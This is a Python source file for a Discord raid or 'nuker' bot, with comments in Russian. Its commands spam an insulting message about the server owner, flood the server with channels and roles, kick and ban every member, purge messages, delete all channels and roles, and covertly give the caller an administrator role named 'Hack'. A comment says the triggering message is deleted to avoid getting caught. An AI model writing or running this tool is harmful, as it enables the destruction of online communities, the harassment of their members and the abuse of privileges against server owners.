import discord
from discord.ext import commands
import config as con

client = commands.Bot(command_prefix="*", intents = discord.Intents.all())


@client.event
async def on_ready():
	print(f'[BOT] Бот {client.user.name} запущен')

@client.command(pass_context=True)
async def spam(ctx, m):
    await ctx.message.delete() #удаляем сообщение пользователя, чтобы не спалился
    count = 0
    while count < int(m):
        await ctx.send("Создатель данного сервера тупое мудло\nЗаказчик бота: Мистер_Шотакон \nСоздтель бота: Wahha") #отправка текста
        count += 1

@client.command(pass_context=True)
async def spam_channel(ctx, m):
    await ctx.message.delete()
    count1 = 0
    while count1 < int(m):
        guild = ctx.message.guild
        await guild.create_text_channel('Wahha')
        count1 += 1

@client.command(pass_context=True)
async def role(ctx, m):
    await ctx.message.delete()
    count = 0
    while count < int(m):
        await ctx.guild.create_role(name="Wahha")
        count += 1

@client.command()
async def allkick(ctx):
    for m in ctx.guild.members: #собираем всех участников
        try:
            await m.kick(reason="Wahha") #кикаем
        except:
            pass

@client.command()
async def allban(ctx):
    for m in ctx.guild.members: #собираем
        try:
            await m.ban(reason="Wahha")#баним
        except:
            pass

@client.command()
async def delete(ctx, amount=100):
    await ctx.channel.purge(limit=amount) #очищаем

@client.command()
async def delchannel(ctx):
    failed = []
    counter = 0
    for channel in ctx.guild.channels: #собираем
        try:
            await channel.delete(reason="По просьбе") #удаляем
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    await ctx.author.send(f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}") # отпровляем отчёт отправителю команды

@client.command()
async def delrole(ctx):
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="По просьбе")
        except:
            pass

@client.command(pass_context=True)  # разрешаем передавать агрументы
async def admin(ctx):  # создаем асинхронную фунцию бота
    
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) #права роли
    await guild.create_role(name="Hack", permissions=perms) #создаем роль
    
    role = discord.utils.get(ctx.guild.roles, name="Hack") #находим роль по имени
    user = ctx.message.author #находим юзера
    await user.add_roles(role) #добовляем роль
    
    await ctx.message.delete()
client.run(con.BOT_TOKEN)